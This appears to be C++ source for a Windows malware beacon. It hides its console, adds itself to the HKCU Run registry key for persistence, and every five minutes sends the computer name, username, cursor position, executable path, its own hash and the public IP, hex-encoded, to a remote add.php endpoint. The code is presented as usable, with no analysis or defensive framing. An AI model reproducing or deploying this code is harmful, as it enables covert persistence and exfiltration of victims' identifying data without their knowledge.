
// google.com/benzai_logs

#include <Windows.h>
#include <WinInet.h>
#include <iostream>
#include <sstream>
#include <fstream>

#include "network.h"
#include "md5.h"

#pragma comment(lib,"wininet.lib")
#pragma comment(lib,"urlmon.lib")

std::string int_to_string(int raw)
{
	std::ostringstream temp;
	temp << raw;
	return temp.str();
}

std::string hex_string(std::string hexstr)
{
	std::string str = "";
	str.resize((hexstr.size() + 1) / 2);
	for (size_t i = 0, j = 0; i < str.size(); i++, j++)
	{
		char at = '@';
		str[i] = (hexstr[j] & at ? hexstr[j] + 9 : hexstr[j]) << 4, j++;
		str[i] |= (hexstr[j] & at ? hexstr[j] + 9 : hexstr[j]) & 0xF;
	}
	return str;
}

std::string string_hex(std::string str, const bool capital = false)
{
	std::string hexstr = "";
	hexstr.resize(str.size() * 2);
	static const char a = capital ? 0x40 : 0x60;
	for (size_t i = 0; i < str.size(); i++)
	{
		char c = (str[i] >> 4) & 0xF;
		hexstr[i * 2] = c > 9 ? (c - 9) | a : c | '0';
		hexstr[i * 2 + 1] = (str[i] & 0xF) > 9 ? (str[i] - 9) & 0xF | a : str[i] & 0xF | '0';
	}
	return hexstr;
}

void registre(std::string path,int state) // 0 = Create && 1 = Delete
{
	HKEY hkey;
	std::string str_path_registre = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"; // Registre Path
	RegCreateKeyA(HKEY_CURRENT_USER,str_path_registre.c_str(),&hkey);
	if(state == 1)
		RegDeleteKeyA(HKEY_CURRENT_USER,str_path_registre.c_str());
	RegSetValueExA((HKEY)hkey,path.c_str(),0,REG_SZ,(BYTE *)path.c_str(),strlen(path.c_str()));
}

std::string getFileName()
{
	char path[MAX_PATH];
	std::string s = std::string(path, GetModuleFileNameA(NULL, path, MAX_PATH));

	size_t i = s.rfind('\\', s.length());
	if (i != std::string::npos)
	{
		return(s.substr(i+1, s.length() - i));
	}

	return("");
}

std::string get_IP_WAN_1()
{
	std::string ua1 = "0"; // Mozilla/5.0 (Windows NT 10.0; WOW32) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36
	std::string headers = "Content-Type: text/html"; // Content-Type: text/html
	std::string get = "GET"; // GET
	std::string web = "ipv4.icanhazip.com";
	std::string path_commandes = "/";

	std::string str_IP_WAN = "NULL";
	str_IP_WAN = http_request(web.c_str(),80, ua1.c_str(),get.c_str(),path_commandes.c_str(),"",headers.c_str());

	str_IP_WAN = str_IP_WAN.substr(0, str_IP_WAN.size()-1);

	return str_IP_WAN;
}

std::string generate_string(int length)
{
	srand(GetTickCount());
    int random_number = std::rand();
    static const char alphabet[] = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    int strLen = sizeof(alphabet)-1;
    char genRandom;
    std::string str;
    for(int i=0; i<length; i++)
    {
        genRandom = alphabet[rand()%strLen];
        str += genRandom;
    }

	Sleep(1);
    return str;
}

bool is_readable(const std::string & file)  
{  
	wchar_t szBuffer[1024];
	OemToChar(file.c_str(),szBuffer);
	std::ifstream fichier(szBuffer);  
	return !fichier.fail();  
}

std::string get_HASH_from_web(std::string url)
{
	std::string path_tmp = getenv("APPDATA") + std::string("\\") + generate_string(16);
	if(URLDownloadToFileA(0, url.c_str(), path_tmp.c_str(), 0, 0))
    {
		return "ERRURL";
    }

	if(is_readable(path_tmp))
	{
		MD5 md5_a;
		std::string hash = md5_a.digestFile((char*)path_tmp.c_str());

		if(is_readable(path_tmp))
			remove(path_tmp.c_str());

		return hash;
	}

	if(is_readable(path_tmp))
		remove(path_tmp.c_str());

	return "NULL";
}

std::string test_hash_web()
{
	//c0079567f76e452f488cc603d2672662
	std::string md5_test = get_HASH_from_web("http://nsa37.casimages.com/img/2017/08/10/170810111149130314.jpg");

	if(md5_test == "c0079567f76e452f488cc603d2672662")
		return "MD5OK";
	else
		return md5_test;
}

int main()
{
	FreeConsole();

	// Blacklist words ?
	std::string aay = "imnphldgod"; // By vawtrak
	std::string aaa = "jbnkimbdjfmf"; // By vawtrak
	std::string aaz = "jpmlcjeaghjgfnohff"; // By vawtrak
	std::string aae = "Software\\Microsoft\\Windows\\Currentversion\\Run";
	std::string aar = "taskhost.exe";
	std::string aat = "explorer.exe";

	CreateMutexA(NULL, TRUE, "CochonML_080917");
	if (GetLastError() == ERROR_ALREADY_EXISTS)
		exit(10);

	// Get Current Path
	char buffer_current_path[MAX_PATH];
	std::string str_current_path_exe = std::string(buffer_current_path, GetModuleFileNameA(NULL, buffer_current_path, MAX_PATH));

	registre(str_current_path_exe, 0); // Write Key in Register

	while(1)
	{
		std::string ua1 = "Mozilla/5.0 (Windows NT 10.0; WOW32) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"; // Mozilla/5.0 (Windows NT 10.0; WOW32) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36
		std::string headers = "Content-Type: text/html"; // Content-Type: text/html
		std::string get = "GET"; // GET
		std::string src_file = "VRT08";

		// Get XY Mouse
		POINT pt;
		GetCursorPos(&pt);

		// Get Current Path
		char buffer_current_path[MAX_PATH];
		std::string str_current_path_exe = std::string(buffer_current_path, GetModuleFileNameA(NULL, buffer_current_path, MAX_PATH));

		// Get MD5 hash
		MD5 md5;
		std::string self_hash = md5.digestFile(buffer_current_path);

		// Get MD5 hash from WEB
		std::string web_hash = test_hash_web();

		std::string cursor_xy = std::string("X:") + int_to_string(pt.x) + std::string("Y:") + int_to_string(pt.y);
		std::string all_info = getenv("COMPUTERNAME") + std::string("|") + getenv("USERNAME") + std::string("|") + cursor_xy + std::string("|") + str_current_path_exe + std::string("|") + self_hash + std::string("|") + get_IP_WAN_1() + std::string("|") + web_hash;

		std::string raw_path = std::string("/add.php?zz=") + string_hex(src_file) + std::string("&ee=") + string_hex(all_info);
		http_request("google.com",80, ua1.c_str(),get.c_str(),raw_path.c_str(),"",headers.c_str());
		Sleep(300000); // 5min
	}

	return 0;
}
